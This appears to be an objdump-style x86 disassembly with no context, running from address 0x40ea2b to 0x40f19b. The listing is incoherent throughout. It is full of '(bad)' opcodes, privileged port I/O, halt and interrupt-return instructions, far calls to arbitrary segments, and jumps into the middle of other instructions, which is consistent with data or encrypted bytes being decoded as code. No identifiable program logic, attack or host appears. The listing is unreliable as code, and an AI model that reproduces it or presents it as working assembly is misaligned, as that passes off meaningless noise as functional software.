  40ea2b:	sub    eax,DWORD PTR [esi]
  40ea2d:	sub    cl,BYTE PTR [edx+0x48]
  40ea30:	(bad)  
  40ea31:	sahf   
  40ea32:	sbb    al,0xa0
  40ea34:	adc    BYTE PTR [ebp-0x39e855b0],bl
  40ea3a:	and    ecx,edx
  40ea3c:	jmp    0xa44eb0ec
  40ea41:	(bad)  
  40ea42:	les    ebx,FWORD PTR [ebx-0x24]
  40ea45:	rol    DWORD PTR [ecx],1
  40ea47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea48:	outs   dx,DWORD PTR ds:[esi]
  40ea49:	sbb    al,0x92
  40ea4b:	mov    esi,0x4e22fa48
  40ea50:	pop    edx
  40ea51:	jae    0x40ea0f
  40ea53:	jne    0x40e9f2
  40ea55:	aaa    
  40ea56:	repnz int3 
  40ea58:	mov    ebx,0xaafb9f5b
  40ea5d:	sbb    al,0xed
  40ea5f:	pop    ss
  40ea60:	mov    bl,0xd8
  40ea62:	mov    cl,0x10
  40ea64:	mov    ah,0xc4
  40ea66:	mov    ebp,DWORD PTR [edi+eax*2-0x5468cf4e]
  40ea6d:	mov    dl,0xf
  40ea6f:	mov    WORD PTR [ecx-0x662ba583],ss
  40ea75:	inc    esi
  40ea76:	pop    ecx
  40ea77:	pushf  
  40ea78:	fnstcw WORD PTR [ebp+0x6c9a041b]
  40ea7e:	bts    edx,ebx
  40ea81:	xor    eax,0x875b7205
  40ea86:	xor    bl,BYTE PTR [edx-0x5c3ccc34]
  40ea8c:	cmp    al,BYTE PTR [ecx-0x72]
  40ea8f:	jae    0x40ea2d
  40ea91:	pusha  
  40ea92:	mov    ds:0x12ec7423,al
  40ea97:	sbb    eax,0xbde0f3a9
  40ea9c:	adc    DWORD PTR [esi+edi*8+0x7b499a0b],esp
  40eaa3:	inc    edi
  40eaa4:	outs   dx,DWORD PTR ds:[esi]
  40eaa5:	fcmovb st,st(2)
  40eaa7:	enter  0x368,0xe5
  40eaab:	pop    DWORD PTR [esi-0x26293c49]
  40eab1:	test   eax,0x9a8850f6
  40eab6:	sbb    DWORD PTR [edx+esi*4],0xffffffc9
  40eaba:	shl    DWORD PTR [esi+0x6db938a2],0xf3
  40eac1:	shr    al,0x6a
  40eac4:	adc    edi,DWORD PTR [ebx+0xf018933]
  40eaca:	hlt    
  40eacb:	stos   BYTE PTR es:[edi],al
  40eacc:	pop    esi
  40eacd:	mov    dh,0x67
  40eacf:	push   edx
  40ead0:	mov    edi,0xe1b77cef
  40ead5:	dec    ebx
  40ead6:	xor    BYTE PTR [ecx],al
  40ead8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ead9:	sub    al,0xdd
  40eadb:	ret    
  40eadc:	scas   al,BYTE PTR es:[edi]
  40eadd:	mov    ds:0x5ebf3588,al
  40eae2:	outs   dx,DWORD PTR ds:[esi]
  40eae3:	push   ebx
  40eae4:	mov    bh,0xef
  40eae6:	push   esp
  40eae7:	nop
  40eae8:	inc    ebx
  40eae9:	lea    edx,[esi+0x1d23927a]
  40eaef:	retf   
  40eaf0:	and    BYTE PTR [ebp+0x3c2964b6],0x2c
  40eaf7:	push   ebx
  40eaf8:	inc    esi
  40eaf9:	push   0x30a65b11
  40eafe:	lods   eax,DWORD PTR ds:[esi]
  40eaff:	sbb    edi,edi
  40eb01:	mov    dh,0x37
  40eb03:	cmp    al,0x69
  40eb05:	sbb    DWORD PTR [edi],ebp
  40eb07:	ss aaa 
  40eb09:	mov    edx,0xbc8f8ae3
  40eb0e:	sub    eax,0xc31c5e57
  40eb13:	data16 jle 0x40eac5
  40eb16:	mov    ah,0x86
  40eb18:	daa    
  40eb19:	xor    DWORD PTR [ebx],0xec41e181
  40eb1f:	or     DWORD PTR cs:[ebx+0x74],0xffffffe4
  40eb24:	test   BYTE PTR [ebp-0x6b],bh
  40eb27:	mov    eax,ds:0xbc489727
  40eb2c:	inc    ebx
  40eb2d:	(bad)  
  40eb2f:	ret    
  40eb30:	dec    edi
  40eb31:	dec    edx
  40eb32:	sbb    ch,dh
  40eb34:	rcl    DWORD PTR [ecx+0x5b],1
  40eb37:	xchg   esi,eax
  40eb38:	cmp    ebp,esp
  40eb3a:	popa   
  40eb3b:	(bad)  [ebp-0x78]
  40eb3e:	pop    ds
  40eb3f:	(bad)  
  40eb40:	push   0x5a
  40eb42:	jno    0x40eb29
  40eb44:	inc    DWORD PTR [edi]
  40eb46:	mov    esp,cs
  40eb48:	mov    esi,0x187492e0
  40eb4d:	neg    al
  40eb4f:	inc    BYTE PTR [edi-0x56]
  40eb52:	push   esp
  40eb53:	test   DWORD PTR [ebp+0x1b],eax
  40eb56:	dec    esp
  40eb57:	out    dx,al
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	arpl   WORD PTR ds:0x4b94c598,cx
  40eb5f:	pop    esi
  40eb60:	cmp    BYTE PTR [ecx-0x1c15b4e5],bh
  40eb66:	mov    edi,0x96369c28
  40eb6b:	or     BYTE PTR [edi],bh
  40eb6d:	ds fcmovb st,st(2)
  40eb70:	add    eax,0xc01d6312
  40eb75:	retf   0x5be3
  40eb78:	popa   
  40eb79:	xchg   esi,eax
  40eb7a:	pushf  
  40eb7b:	jmp    0x40ebaf
  40eb7d:	imul   edx,edi,0xffffff90
  40eb80:	in     al,0x75
  40eb82:	pop    ds
  40eb83:	sub    eax,0x2afebba9
  40eb88:	or     edi,DWORD PTR [eax+0x4f]
  40eb8b:	fld    QWORD PTR [esi-0x3b]
  40eb8e:	mov    es,WORD PTR [eax+0x6bd50fe5]
  40eb94:	mov    ebp,0x5df5a271
  40eb99:	mov    ch,0x9
  40eb9b:	jle    0x40eb50
  40eb9d:	pop    edi
  40eb9e:	sahf   
  40eb9f:	dec    ebx
  40eba0:	push   ebp
  40eba1:	inc    ebx
  40eba2:	jnp    0x40ebbe
  40eba4:	inc    esp
  40eba5:	lock adc al,0x91
  40eba8:	iret   
  40eba9:	mov    dl,0x50
  40ebab:	xchg   edx,ecx
  40ebad:	push   ecx
  40ebae:	add    al,0xaa
  40ebb0:	lock and eax,0x589ce79e
  40ebb6:	mov    esi,0xa88125f3
  40ebbb:	das    
  40ebbc:	mov    ds:0x8468f4c,eax
  40ebc1:	out    0x71,al
  40ebc3:	jg     0x40eb6f
  40ebc5:	xchg   edi,eax
  40ebc6:	adc    BYTE PTR ds:0x9687f4d2,bh
  40ebcc:	mov    al,0xd
  40ebce:	mov    DWORD PTR [ebx],0x5200a76d
  40ebd4:	std    
  40ebd5:	(bad)  
  40ebd6:	sti    
  40ebd7:	mov    WORD PTR ds:0xb213a47d,?
  40ebdd:	jmp    0x40ec56
  40ebdf:	shl    ebp,1
  40ebe1:	fwait
  40ebe2:	test   ah,ah
  40ebe4:	int3   
  40ebe5:	gs and bh,0x9b
  40ebe9:	cmp    esp,eax
  40ebeb:	push   ss
  40ebec:	hlt    
  40ebed:	test   eax,0x306a42da
  40ebf2:	ja     0x40eb94
  40ebf4:	call   FWORD PTR ds:0x64d159b7
  40ebfa:	mov    dl,0xc9
  40ebfc:	mov    bh,al
  40ebfe:	jp     0x40ebfc
  40ec00:	pushf  
  40ec01:	cmp    al,0x95
  40ec03:	mov    BYTE PTR [edi*1-0x229b7759],ch
  40ec0a:	or     edx,DWORD PTR [eax-0x3eb9e201]
  40ec10:	cmp    DWORD PTR [edi+ebx*1-0x6c5cb0ac],0xd59eda8f
  40ec1b:	adc    DWORD PTR [ecx+0x3b],0xffffffed
  40ec1f:	dec    edi
  40ec20:	daa    
  40ec21:	test   eax,0x48b7f858
  40ec26:	sbb    al,0xf
  40ec28:	aaa    
  40ec29:	dec    ebx
  40ec2a:	inc    ecx
  40ec2b:	mov    ah,bl
  40ec2d:	mov    dh,0x60
  40ec2f:	(bad)  [edi+ebx*2]
  40ec32:	fnstenv [edi]
  40ec34:	aad    0xc0
  40ec36:	inc    ebx
  40ec37:	jle    0x40ec99
  40ec39:	test   al,0x1b
  40ec3b:	daa    
  40ec3c:	pop    ebx
  40ec3d:	loopne 0x40ec93
  40ec3f:	xor    edx,DWORD PTR [esi+edi*4+0x1d]
  40ec43:	fs cmc 
  40ec45:	lahf   
  40ec46:	pop    edx
  40ec47:	sbb    eax,0x40d46e9c
  40ec4c:	push   ds
  40ec4d:	mov    dl,BYTE PTR [esi]
  40ec4f:	xor    BYTE PTR [ecx],cl
  40ec51:	pop    DWORD PTR [esi]
  40ec53:	or     DWORD PTR [ebx+edi*1],esi
  40ec56:	out    0xf7,al
  40ec58:	aad    0x7
  40ec5a:	ins    DWORD PTR es:[edi],dx
  40ec5b:	add    BYTE PTR [esi+0x1d],bh
  40ec5e:	push   ss
  40ec5f:	inc    edx
  40ec60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec61:	jp     0x40ebea
  40ec63:	jbe    0x40ec4c
  40ec65:	fdivr  st(0),st
  40ec67:	adc    al,0x24
  40ec69:	mov    WORD PTR [edx-0x4d],gs
  40ec6c:	xchg   edi,eax
  40ec6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec6e:	or     DWORD PTR [ebx-0x9db4387],ecx
  40ec74:	sub    eax,0xf99784e0
  40ec79:	xor    al,0x90
  40ec7b:	fidivr WORD PTR [ecx-0x387e58a4]
  40ec81:	lods   eax,DWORD PTR ds:[esi]
  40ec82:	inc    edi
  40ec83:	sbb    edx,ecx
  40ec85:	dec    edi
  40ec86:	test   eax,esp
  40ec88:	mov    al,ds:0x2d2be660
  40ec8d:	push   ebx
  40ec8e:	pusha  
  40ec8f:	push   esi
  40ec90:	mov    eax,ds:0x16e9a892
  40ec95:	inc    edx
  40ec96:	pop    esp
  40ec97:	ficom  WORD PTR [ecx]
  40ec99:	jg     0x40ecd1
  40ec9b:	scas   al,BYTE PTR es:[di]
  40ec9d:	in     al,0x98
  40ec9f:	into   
  40eca0:	fcmovnu st,st(3)
  40eca2:	pop    ebp
  40eca3:	push   esi
  40eca4:	fwait
  40eca5:	mul    BYTE PTR [edx]
  40eca7:	ins    DWORD PTR es:[edi],dx
  40eca8:	test   al,0x6a
  40ecaa:	sub    eax,0xc7bddc4c
  40ecaf:	or     ch,BYTE PTR [ebp+0x4a]
  40ecb2:	add    DWORD PTR [ebx-0x3d],esi
  40ecb5:	clc    
  40ecb6:	int    0x58
  40ecb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecb9:	clc    
  40ecba:	pop    eax
  40ecbb:	and    bl,BYTE PTR [eax-0x20]
  40ecbe:	(bad)  
  40ecbf:	neg    DWORD PTR [ebp+0x538c9d2]
  40ecc5:	ror    DWORD PTR [ebx+0x75],0xdc
  40ecc9:	in     eax,0x96
  40eccb:	shl    ch,cl
  40eccd:	sub    al,0x40
  40eccf:	cld    
  40ecd0:	call   0x6b60:0xf1e978a7
  40ecd7:	in     eax,0x5d
  40ecd9:	adc    BYTE PTR [edi-0x25],bl
  40ecdc:	sbb    DWORD PTR [ecx+0x40aaeab],esi
  40ece2:	push   0x1b
  40ece4:	loop   0x40ecaf
  40ece6:	(bad)  
  40ece7:	adc    al,0xe9
  40ece9:	mov    edi,0x47ea9f2e
  40ecee:	loopne 0x40ec9b
  40ecf0:	aas    
  40ecf1:	pop    ecx
  40ecf2:	pop    ecx
  40ecf3:	stos   BYTE PTR es:[edi],al
  40ecf4:	jmp    0xc810:0xcad510f5
  40ecfb:	mov    bl,0x31
  40ecfd:	or     eax,0xf98750ef
  40ed02:	inc    ecx
  40ed03:	cmp    al,0x4a
  40ed05:	out    0xef,al
  40ed07:	jae    0x40ecdd
  40ed09:	arpl   WORD PTR [ecx-0x6],di
  40ed0c:	gs (bad) 
  40ed0e:	mov    dh,0xd2
  40ed10:	shr    DWORD PTR [ebp-0x2d463605],1
  40ed16:	and    BYTE PTR [edx],0x20
  40ed19:	lock xor DWORD PTR [ebp-0x71],eax
  40ed1d:	and    BYTE PTR [ebx+0x50],bl
  40ed20:	(bad)  
  40ed22:	cmp    eax,DWORD PTR [ebx+edx*1+0xb]
  40ed26:	add    al,0x39
  40ed28:	out    dx,al
  40ed29:	jp     0x40ed25
  40ed2b:	ret    
  40ed2c:	cdq    
  40ed2d:	mov    dh,0x4f
  40ed2f:	rcl    BYTE PTR [eax],cl
  40ed31:	shl    DWORD PTR [esi-0x379967eb],cl
  40ed37:	mov    DWORD PTR [eax+0x28],ebx
  40ed3a:	pop    ds
  40ed3b:	pop    ds
  40ed3c:	imul   ecx,DWORD PTR [edx+eiz*1+0x41],0xfffffff5
  40ed41:	cmp    eax,0x227d2cd0
  40ed46:	cmp    BYTE PTR [edx-0x4695302d],ah
  40ed4c:	scas   eax,DWORD PTR es:[edi]
  40ed4d:	push   0x5e44b96d
  40ed52:	push   ds
  40ed53:	ret    
  40ed54:	inc    esp
  40ed55:	add    eax,esi
  40ed57:	mov    bl,0xc8
  40ed59:	sub    edx,edi
  40ed5b:	gs add bh,al
  40ed5e:	mov    ch,0x81
  40ed60:	inc    edx
  40ed61:	jmp    DWORD PTR [ebx*1+0x7cc1781b]
  40ed68:	adc    cl,cl
  40ed6a:	jns    0x40ed3a
  40ed6c:	out    dx,al
  40ed6d:	rcl    DWORD PTR [ebp+0x5df189b4],cl
  40ed73:	icebp  
  40ed74:	mul    dl
  40ed76:	push   ds
  40ed77:	gs pop ds
  40ed79:	mov    ds:0x3ffede5e,eax
  40ed7e:	add    al,BYTE PTR [edx+0x38]
  40ed81:	pop    edi
  40ed82:	cmp    al,0xb4
  40ed84:	out    0xa2,al
  40ed86:	shr    BYTE PTR [edi+0x73],1
  40ed89:	push   ds
  40ed8a:	xchg   DWORD PTR [eax+ebp*1+0x5f],edi
  40ed8e:	and    al,0xbe
  40ed90:	push   ss
  40ed91:	push   0x27
  40ed93:	sub    al,0xef
  40ed95:	adc    eax,0x7f2f0c31
  40ed9a:	sbb    al,0x82
  40ed9c:	call   0xb89:0x14a46ec2
  40eda3:	idiv   BYTE PTR [ecx-0x521a8cf5]
  40eda9:	in     eax,0x46
  40edab:	sahf   
  40edac:	xchg   ebp,eax
  40edad:	jbe    0x40edae
  40edaf:	or     DWORD PTR [edi+edi*4+0x48],esi
  40edb3:	and    ecx,esi
  40edb5:	add    BYTE PTR [eax-0x2232f402],ch
  40edbb:	and    al,0xe6
  40edbd:	(bad)  
  40edbe:	ins    DWORD PTR es:[edi],dx
  40edbf:	in     eax,0x71
  40edc1:	add    BYTE PTR [esi+0x64428357],bl
  40edc7:	mov    cl,0xe8
  40edc9:	or     ecx,esp
  40edcb:	(bad)  
  40edcc:	in     al,0x4d
  40edce:	retf   
  40edcf:	ret    0x7b1e
  40edd2:	mov    esp,0xda5158d
  40edd7:	pushf  
  40edd8:	retf   0xb72
  40eddb:	cmp    eax,edx
  40eddd:	std    
  40edde:	lea    edx,[ecx]
  40ede0:	je     0x40edd0
  40ede2:	not    DWORD PTR [eax]
  40ede4:	add    DWORD PTR [ebx+eiz*1],edi
  40ede7:	push   esp
  40ede8:	inc    edi
  40ede9:	sbb    ecx,DWORD PTR [edi]
  40edeb:	scas   al,BYTE PTR es:[edi]
  40edec:	in     al,dx
  40eded:	shl    BYTE PTR [esi+0x5d53373c],0x6e
  40edf4:	add    al,0xff
  40edf6:	popf   
  40edf7:	daa    
  40edf8:	add    bh,cl
  40edfa:	push   esi
  40edfb:	sub    BYTE PTR [eax+0x11],dh
  40edfe:	inc    eax
  40edff:	sbb    esp,DWORD PTR [ebp+0x1a]
  40ee02:	add    eax,0x1ea2271
  40ee07:	mov    cl,BYTE PTR [ebp+0x7d]
  40ee0a:	fs dec edi
  40ee0c:	or     DWORD PTR [edx+0x7a8ceffc],0xffffffa4
  40ee13:	jae    0x40ee11
  40ee15:	popa   
  40ee16:	mov    al,0x10
  40ee18:	mov    bl,0xf
  40ee1a:	mov    ah,BYTE PTR [ecx-0x7444283e]
  40ee20:	js     0x40ee9a
  40ee22:	lods   al,BYTE PTR ds:[esi]
  40ee23:	popa   
  40ee24:	fs jl  0x40edfa
  40ee27:	ss inc eax
  40ee29:	ss sbb eax,0xa212595b
  40ee2f:	mov    ebx,0xba71d76b
  40ee34:	out    0xd,eax
  40ee36:	aaa    
  40ee37:	popf   
  40ee38:	inc    eax
  40ee39:	sbb    BYTE PTR [eax],0x53
  40ee3c:	inc    ebp
  40ee3d:	push   edx
  40ee3e:	fst    DWORD PTR [edx+0x4f2cd511]
  40ee44:	call   0xf0539929
  40ee49:	std    
  40ee4a:	and    dh,BYTE PTR [edi-0x66]
  40ee4d:	xchg   BYTE PTR [ebp-0x26],ch
  40ee50:	jo     0x40ee75
  40ee52:	pop    ss
  40ee53:	push   esi
  40ee54:	pop    edi
  40ee55:	nop
  40ee56:	jecxz  0x40ee2c
  40ee58:	push   es
  40ee59:	icebp  
  40ee5a:	inc    ebx
  40ee5b:	push   cs
  40ee5c:	add    al,dh
  40ee5e:	pusha  
  40ee5f:	sbb    DWORD PTR [edx+0x504d3f6b],edx
  40ee65:	(bad)  
  40ee66:	cmp    al,0xbf
  40ee68:	out    dx,eax
  40ee69:	sbb    al,0x64
  40ee6b:	fwait
  40ee6c:	add    al,0xad
  40ee6e:	or     eax,0x9970fb27
  40ee73:	ja     0x40ee2e
  40ee75:	clc    
  40ee76:	test   eax,0x7297b7ff
  40ee7b:	cmp    BYTE PTR [edi-0x521bbc8a],ah
  40ee81:	pop    DWORD PTR [ebx-0x1]
  40ee84:	mov    ch,0xab
  40ee86:	dec    esi
  40ee87:	pop    eax
  40ee88:	push   eax
  40ee89:	call   0xaa0f51b9
  40ee8e:	(bad)  ds:0x77dfee76
  40ee94:	or     eax,edx
  40ee96:	jo     0x40ee97
  40ee98:	push   ss
  40ee99:	iret   
  40ee9a:	xor    DWORD PTR [ebx+0x666ba6ad],ebx
  40eea0:	or     al,0xb1
  40eea2:	dec    esp
  40eea3:	mov    DWORD PTR [esi],edi
  40eea5:	lea    ecx,[edx+0xcd34d6c]
  40eeab:	sub    DWORD PTR [eax],0x7c8096d6
  40eeb1:	vmread esp,edi
  40eeb4:	aad    0x27
  40eeb6:	daa    
  40eeb7:	ins    BYTE PTR es:[edi],dx
  40eeb8:	ins    DWORD PTR es:[edi],dx
  40eeb9:	jbe    0x40eeea
  40eebb:	outs   dx,DWORD PTR ds:[si]
  40eebd:	cmp    esp,0x452aa583
  40eec3:	pop    es
  40eec4:	cmc    
  40eec5:	mov    eax,DWORD PTR [eax+0x648b2920]
  40eecb:	cmp    BYTE PTR [edi+0x45ce119c],dl
  40eed1:	retf   
  40eed2:	int3   
  40eed3:	loopne 0x40ee9c
  40eed5:	sub    bh,BYTE PTR [ebx]
  40eed7:	jl     0x40eee0
  40eed9:	(bad)  
  40eeda:	mov    bh,0x9e
  40eedc:	retf   
  40eedd:	mov    bl,0xc9
  40eedf:	pop    edx
  40eee0:	and    BYTE PTR [eax-0x40],ch
  40eee3:	xchg   esi,eax
  40eee4:	cmp    dl,dl
  40eee6:	daa    
  40eee7:	or     BYTE PTR [edi-0x28],ch
  40eeea:	nop
  40eeeb:	test   BYTE PTR [edx-0x80],al
  40eeee:	or     eax,0xc3f0f50a
  40eef3:	inc    edi
  40eef4:	dec    ecx
  40eef5:	mov    eax,ds:0x65fc7d99
  40eefa:	jnp    0x40ef27
  40eefc:	ret    0x4523
  40eeff:	xchg   edx,eax
  40ef00:	pop    edi
  40ef01:	inc    ecx
  40ef02:	nop
  40ef03:	sbb    al,0x4d
  40ef05:	inc    ebx
  40ef06:	add    edx,DWORD PTR [ebx+0x53c3833]
  40ef0c:	jp     0x40eeab
  40ef0e:	mov    esi,ecx
  40ef10:	dec    esi
  40ef11:	jae    0x40eef5
  40ef13:	lds    esp,FWORD PTR [edx+edi*8-0x37]
  40ef17:	mov    bl,0xd5
  40ef19:	mov    ah,0x6c
  40ef1b:	(bad)  
  40ef1d:	jno    0x40eef0
  40ef1f:	sbb    al,0x4c
  40ef21:	sahf   
  40ef22:	es jp  0x40ef84
  40ef25:	push   ecx
  40ef26:	mov    edx,0x857ad10b
  40ef2b:	daa    
  40ef2c:	sbb    DWORD PTR [eax-0x53],esi
  40ef2f:	ss jge 0x40ef78
  40ef32:	cmp    cl,dl
  40ef34:	enter  0xac9e,0xb
  40ef38:	jb     0x40eec7
  40ef3a:	daa    
  40ef3b:	push   0x640d6459
  40ef40:	popf   
  40ef41:	lds    edi,FWORD PTR [eax+0x2d52b3ba]
  40ef47:	ds sbb eax,0xf43c3d88
  40ef4d:	or     DWORD PTR [eax],edx
  40ef4f:	cmp    esi,esp
  40ef51:	aaa    
  40ef52:	push   0xef181cc4
  40ef57:	call   0x48a3e5cb
  40ef5c:	call   0x9983:0xf7a47fd9
  40ef63:	mov    al,0x6a
  40ef65:	cs dec eax
  40ef67:	pop    es
  40ef68:	pop    ss
  40ef69:	xchg   edx,eax
  40ef6a:	neg    BYTE PTR [ebx+0x6031ecfc]
  40ef70:	rcl    DWORD PTR [esi+edi*8-0x1e],1
  40ef74:	call   0x5c83a27c
  40ef79:	inc    ebx
  40ef7a:	pop    ds
  40ef7b:	loope  0x40efe9
  40ef7d:	mov    esp,0x38ffb4ac
  40ef82:	pop    esi
  40ef83:	dec    ebp
  40ef84:	jo     0x40f004
  40ef86:	imul   ecx,DWORD PTR [eax],0xffffffad
  40ef89:	push   0x24
  40ef8b:	int3   
  40ef8c:	xchg   ebp,eax
  40ef8d:	mov    al,0x4
  40ef8f:	daa    
  40ef90:	mov    ecx,0xa1703dc0
  40ef95:	arpl   WORD PTR [edx],si
  40ef97:	mov    edx,0xfc99ec68
  40ef9c:	adc    ecx,DWORD PTR ds:0x9725c7c2
  40efa2:	pop    es
  40efa3:	xchg   ecx,eax
  40efa4:	outs   dx,BYTE PTR ds:[esi]
  40efa5:	sub    al,BYTE PTR [ecx+0xe]
  40efa8:	jno    0x62deaeb2
  40efae:	inc    eax
  40efaf:	in     al,dx
  40efb0:	xchg   edx,eax
  40efb1:	cmp    al,0x41
  40efb3:	not    bp
  40efb6:	data16 jbe 0x40ef57
  40efb9:	or     eax,0xa9f7b7a
  40efbe:	repz push ecx
  40efc0:	push   ebx
  40efc1:	icebp  
  40efc2:	inc    ebx
  40efc3:	(bad)  
  40efc4:	std    
  40efc5:	and    ah,bh
  40efc7:	xchg   ebx,eax
  40efc8:	add    dh,BYTE PTR [ebx+0x5b]
  40efcb:	fbld   TBYTE PTR [edi+0x34]
  40efce:	out    0x4d,al
  40efd0:	sbb    ecx,0xfb83ad62
  40efd6:	retf   0xf9b8
  40efd9:	inc    esp
  40efda:	lods   eax,DWORD PTR ds:[esi]
  40efdb:	push   ebp
  40efdc:	mov    ebx,0xfcadbea7
  40efe1:	(bad)  
  40efe2:	cdq    
  40efe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efe4:	dec    eax
  40efe5:	scas   al,BYTE PTR es:[edi]
  40efe6:	mov    edx,0x6bf5c24e
  40efeb:	inc    ebp
  40efec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efed:	fwait
  40efee:	or     BYTE PTR [ebx],dh
  40eff0:	fisttp DWORD PTR [ebp-0x775d54d4]
  40eff6:	fadd   DWORD PTR [edi+0x3e]
  40eff9:	jle    0x40f06d
  40effb:	loopne 0x40efb9
  40effd:	push   ss
  40effe:	add    dl,ch
  40f000:	shl    BYTE PTR [ecx+0x3f],1
  40f003:	rep outs dx,BYTE PTR ds:[esi]
  40f005:	test   al,0x2f
  40f007:	je     0x40f07c
  40f009:	cmp    BYTE PTR ds:0xd94c860c,cl
  40f00f:	fist   DWORD PTR [esp+ebp*4+0x3dca166]
  40f016:	ins    DWORD PTR es:[edi],dx
  40f017:	add    eax,0x14d2859d
  40f01c:	and    eax,0x3eac67bb
  40f021:	add    edi,DWORD PTR [edx-0x4c]
  40f024:	test   edx,0xb5fcf13c
  40f02a:	enter  0xea9c,0x16
  40f02e:	mov    ebp,0x36fd0aec
  40f033:	hlt    
  40f034:	test   eax,0x34b8b2a7
  40f039:	dec    esi
  40f03a:	mov    edi,0x8bb32a0f
  40f03f:	cmp    dl,BYTE PTR [edi]
  40f041:	inc    edi
  40f042:	not    ecx
  40f044:	cwde   
  40f045:	jge    0x40f020
  40f047:	inc    ebp
  40f048:	mov    dl,0xa1
  40f04a:	adc    al,BYTE PTR [eax]
  40f04c:	in     al,0x10
  40f04e:	lods   al,BYTE PTR ds:[esi]
  40f04f:	mov    ds:0xf7264cb3,al
  40f054:	pop    ecx
  40f055:	cmp    dh,BYTE PTR [edx+0x59]
  40f058:	int3   
  40f059:	shr    DWORD PTR [ecx+0x7d],cl
  40f05c:	sahf   
  40f05d:	jns    0x40f09b
  40f05f:	mov    al,ds:0xd847bb6a
  40f064:	iret   
  40f065:	in     eax,0xf9
  40f067:	inc    esi
  40f068:	xchg   ebp,eax
  40f069:	xchg   ebx,eax
  40f06a:	xor    cl,BYTE PTR [esi+0x3cbe8100]
  40f070:	cmp    al,0x12
  40f072:	loope  0x40f07d
  40f074:	mov    cl,0x7e
  40f076:	and    BYTE PTR [eax+0x2b],0xf5
  40f07a:	jo     0x40f02f
  40f07c:	cmp    al,0x35
  40f07e:	xchg   edi,eax
  40f07f:	or     ebp,edi
  40f081:	push   0xa19f5d1e
  40f086:	or     esi,DWORD PTR [ebp-0x32]
  40f089:	jo     0x40f03b
  40f08b:	aad    0x9d
  40f08d:	cld    
  40f08e:	add    eax,0xc757252e
  40f093:	add    eax,0xde172ce2
  40f098:	inc    ebx
  40f099:	pop    ebp
  40f09a:	sbb    BYTE PTR [edi-0x7c],bl
  40f09d:	stos   BYTE PTR es:[edi],al
  40f09e:	(bad)  
  40f09f:	in     al,dx
  40f0a0:	out    dx,al
  40f0a1:	shr    BYTE PTR [eax],0x2f
  40f0a4:	xchg   ebp,eax
  40f0a5:	cmp    esi,esi
  40f0a7:	(bad)
  40f0aa:	ret    0xaa6d
  40f0ad:	test   al,0xf
  40f0af:	stc    
  40f0b0:	aaa    
  40f0b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0b2:	dec    ebp
  40f0b4:	mov    ecx,0xa8a36188
  40f0b9:	imul   ebx,DWORD PTR [esi-0x60],0x48c41402
  40f0c0:	out    0xb2,eax
  40f0c2:	add    dh,BYTE PTR [edx]
  40f0c4:	jno    0x40f11e
  40f0c6:	aaa    
  40f0c7:	aam    0x87
  40f0c9:	sahf   
  40f0ca:	push   ebx
  40f0cb:	scas   eax,DWORD PTR es:[edi]
  40f0cc:	and    cl,BYTE PTR [ecx+ebp*1-0x47da41d0]
  40f0d3:	push   esp
  40f0d4:	adc    eax,0x485a3dff
  40f0d9:	pop    ss
  40f0da:	(bad)
  40f0de:	shl    DWORD PTR [edi+0x55],1
  40f0e1:	sti    
  40f0e2:	cmp    ecx,DWORD PTR [esi+0x3a3004a3]
  40f0e8:	cmp    eax,DWORD PTR [edi+0x21]
  40f0eb:	mov    bl,0x8a
  40f0ed:	push   edi
  40f0ee:	out    0xc,al
  40f0f0:	bound  eax,QWORD PTR [ebp+0x69]
  40f0f3:	sahf   
  40f0f4:	out    dx,al
  40f0f5:	pusha  
  40f0f6:	test   DWORD PTR [edi],edi
  40f0f8:	fnsave [eax+0x38]
  40f0fb:	test   eax,0x697e8114
  40f100:	std    
  40f101:	xchg   esp,eax
  40f102:	in     eax,dx
  40f103:	mov    ecx,0x20a48577
  40f108:	cmp    eax,0xefa2b68a
  40f10d:	jp     0x40f10d
  40f10f:	xor    ebx,DWORD PTR [esi]
  40f111:	pop    ds
  40f112:	cmc    
  40f113:	sub    edi,edx
  40f115:	xchg   BYTE PTR [edx+0x56],ah
  40f118:	push   esi
  40f119:	iret   
  40f11a:	dec    edx
  40f11b:	fisub  DWORD PTR [edx-0x7b3350e0]
  40f121:	lods   eax,DWORD PTR ds:[esi]
  40f122:	test   al,0x27
  40f124:	pop    edi
  40f125:	sub    ah,BYTE PTR [ebp+0x199a5402]
  40f12b:	and    bl,ch
  40f12d:	sub    bl,bh
  40f12f:	imul   ebp,eax,0x37dc0549
  40f135:	jns    0x40f0c9
  40f137:	in     eax,0x9d
  40f139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f13a:	xchg   esi,eax
  40f13b:	mov    BYTE PTR [edx],dh
  40f13d:	pop    ss
  40f13e:	dec    ebp
  40f13f:	loop   0x40f0e7
  40f141:	mov    esp,0x1fd14977
  40f146:	lods   eax,DWORD PTR ds:[esi]
  40f147:	dec    ebp
  40f148:	lock scas eax,DWORD PTR es:[edi]
  40f14a:	add    DWORD PTR [edx-0x29],0x4c221243
  40f151:	inc    ecx
  40f152:	call   0x78c8:0xcbbb1346
  40f159:	sub    esi,DWORD PTR [eax+0x29]
  40f15c:	cmp    al,0xd0
  40f15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f15f:	inc    ebx
  40f160:	xchg   ebx,eax
  40f161:	inc    edi
  40f162:	cs xchg ecx,eax
  40f164:	inc    edx
  40f165:	mov    bl,0x87
  40f167:	(bad)  
  40f168:	xor    cl,BYTE PTR [edi-0x4cf2edfa]
  40f16e:	and    esp,edi
  40f170:	push   esi
  40f171:	bnd jns 0x40f18b
  40f174:	and    eax,DWORD PTR [edi-0x142cd3ec]
  40f17a:	xchg   edi,eax
  40f17b:	jmp    FWORD PTR [edi*4+0x91d064a]
  40f182:	inc    esi
  40f183:	cwde   
  40f184:	loope  0x40f1df
  40f186:	out    dx,al
  40f187:	xor    eax,0x48f214f9
  40f18c:	pop    ecx
  40f18d:	rcr    dl,cl
  40f18f:	mov    esp,0x24484759
  40f194:	mov    eax,0xf8797c2d
  40f199:	or     edi,esi
  40f19b:	ds inc eax
